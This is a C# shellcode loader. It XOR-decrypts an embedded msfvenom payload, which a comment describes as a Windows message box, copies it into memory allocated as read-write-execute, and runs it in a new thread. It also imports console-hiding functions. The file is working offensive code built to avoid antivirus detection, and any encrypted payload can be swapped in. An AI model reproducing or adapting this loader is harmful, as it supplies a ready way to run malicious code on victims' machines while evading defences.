using System;
using System.Text;
using System.Runtime.InteropServices;


public class Program
{

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32")]
    static extern IntPtr GetConsoleWindow();

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    private static byte[] xor(byte[] cipher, byte[] key)
    {
        byte[] xored = new byte[cipher.Length];

        for (int i = 0; i < cipher.Length; i++)
        {
            xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
        }

        return xored;
    }


    static void Main()
    {
        // msfvenom -a x64 -p windows/x64/messagebox Text="hithere" --encrypt xor --encrypt-key DEADBEEF -f csharp 
        string key = "DEADBEEF";

        byte[] xorshellcode = new byte[318] {0xb8,0x0d,0xc0,0xa0,0xb2,0xba,
0xba,0xb9,0xac,0x89,0x41,0x44,0x42,0x04,0x14,0x07,0x14,0x17,
0x10,0x12,0x0a,0x74,0x97,0x23,0x0c,0xce,0x13,0x24,0x0a,0xce,
0x17,0x5e,0x0c,0xce,0x13,0x64,0x0a,0xce,0x37,0x16,0x09,0x74,
0x88,0x0c,0x4d,0xf2,0x0f,0x0c,0x0c,0x74,0x81,0xe8,0x7e,0x24,
0x39,0x44,0x68,0x65,0x00,0x85,0x8b,0x48,0x04,0x47,0x85,0xa7,
0xac,0x16,0x03,0x14,0x0d,0xcd,0x16,0x65,0xca,0x06,0x7e,0x0d,
0x44,0x96,0x22,0xc4,0x39,0x5c,0x49,0x47,0x4a,0xc3,0x36,0x45,
0x41,0x44,0xc9,0xc5,0xcd,0x46,0x44,0x45,0x09,0xc1,0x82,0x31,
0x22,0x0e,0x45,0x95,0xca,0x0c,0x5a,0x15,0x01,0xcd,0x04,0x65,
0x08,0x45,0x92,0xa6,0x13,0x0b,0x75,0x8c,0x09,0xbb,0x8b,0x04,
0xce,0x72,0xcc,0x0d,0x40,0x92,0x0a,0x74,0x85,0x07,0x85,0x8c,
0x4c,0xe8,0x03,0x44,0x84,0x7e,0xa4,0x30,0xb0,0x08,0x41,0x09,
0x61,0x4e,0x01,0x7c,0x90,0x31,0x9a,0x1d,0x01,0xcd,0x04,0x61,
0x08,0x45,0x92,0x23,0x04,0xcd,0x48,0x0d,0x05,0xcf,0x02,0x59,
0x0c,0x47,0x94,0x04,0xca,0x40,0xca,0x04,0x1d,0x0e,0x45,0x95,
0x00,0x1c,0x1c,0x1c,0x1f,0x07,0x1c,0x04,0x18,0x05,0x18,0x0d,
0xc6,0xaa,0x64,0x04,0x13,0xbb,0xa2,0x1d,0x04,0x1f,0x1e,0x0d,
0xca,0x56,0xab,0x0e,0xba,0xb9,0xbb,0x18,0xa9,0x4f,0x42,0x45,
0x45,0x33,0x37,0x20,0x33,0x77,0x70,0x6b,0x21,0x2a,0x28,0x45,
0x18,0x05,0xf8,0x09,0x32,0x60,0x43,0xba,0x94,0x0d,0x85,0x84,
0x45,0x46,0x44,0x45,0xa9,0x52,0x42,0x45,0x45,0x0e,0x21,0x29,
0x2d,0x2b,0x62,0x23,0x37,0x29,0x29,0x65,0x32,0x2c,0x27,0x29,
0x29,0x25,0x2b,0x21,0x24,0x6a,0x42,0x1f,0xad,0x4d,0x44,0x45,
0x41,0x09,0x27,0x36,0x36,0x27,0x23,0x20,0x03,0x2b,0x3a,0x45,
0x04,0x1e,0x0c,0x74,0x88,0x05,0xf8,0x00,0xc6,0x10,0x43,0xba,
0x94,0x0c,0x73,0x8c,0x04,0xfc,0xb4,0xf0,0xe3,0x12,0xbd,0x90
};


        byte[] shellcode;
        shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        return;
    }
}
